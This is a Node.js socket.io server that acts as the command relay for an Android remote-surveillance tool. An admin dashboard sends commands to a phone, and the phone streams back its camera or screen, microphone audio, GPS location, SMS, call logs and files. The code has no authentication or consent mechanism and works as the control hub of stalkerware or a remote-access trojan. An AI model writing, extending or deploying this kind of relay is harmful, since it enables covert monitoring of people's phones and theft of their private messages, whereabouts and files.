const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    maxHttpBufferSize: 1e8 // Increased to 100MB for file transfers
});

app.use(express.static(path.join(__dirname, 'public')));

// Store active connections
let deviceSocket = null;
let adminSocket = null;

io.on('connection', (socket) => {
    console.log('New connection:', socket.id);

    // Identify if the connection is the Android device or the Dashboard
    socket.on('register', (role) => {
        if (role === 'device') {
            deviceSocket = socket;
            console.log('Android Device Connected');
        } else if (role === 'admin') {
            adminSocket = socket;
            console.log('Admin Dashboard Connected');
        }
    });

    // 1. FORWARD COMMANDS: Dashboard -> Android Device
    // Handles commands like 'get-gps', 'get-sms', 'stream:0:video'
    socket.on('phone-execute', (cmd) => {
        if (deviceSocket) {
            console.log('Sending command to device:', cmd);
            deviceSocket.emit('phone-execute', cmd);
        }
    });

    // 2. FORWARD DATA: Android Device -> Dashboard
    
    // Live Camera/Screen frames
    socket.on('data-stream', (base64Data) => {
        if (adminSocket) adminSocket.emit('data-stream', base64Data);
    });

    // Live Mic Audio
    socket.on('audio-stream', (base64Audio) => {
        if (adminSocket) adminSocket.emit('audio-stream', base64Audio);
    });

    // GPS Updates
    socket.on('location-update', (data) => {
        if (adminSocket) adminSocket.emit('location-update', data);
    });

    // SMS and Call Logs
    socket.on('sms-data', (data) => {
        if (adminSocket) adminSocket.emit('sms-data', data);
    });
    
    socket.on('call-data', (data) => {
        if (adminSocket) adminSocket.emit('call-data', data);
    });

    // File Explorer Data
    socket.on('file-data', (data) => {
        if (adminSocket) adminSocket.emit('file-data', data);
    });

    // File Downloads
    socket.on('file-download-ready', (data) => {
        if (adminSocket) adminSocket.emit('file-download-ready', data);
    });

    socket.on('disconnect', () => {
        if (socket === deviceSocket) deviceSocket = null;
        if (socket === adminSocket) adminSocket = null;
        console.log('User disconnected');
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
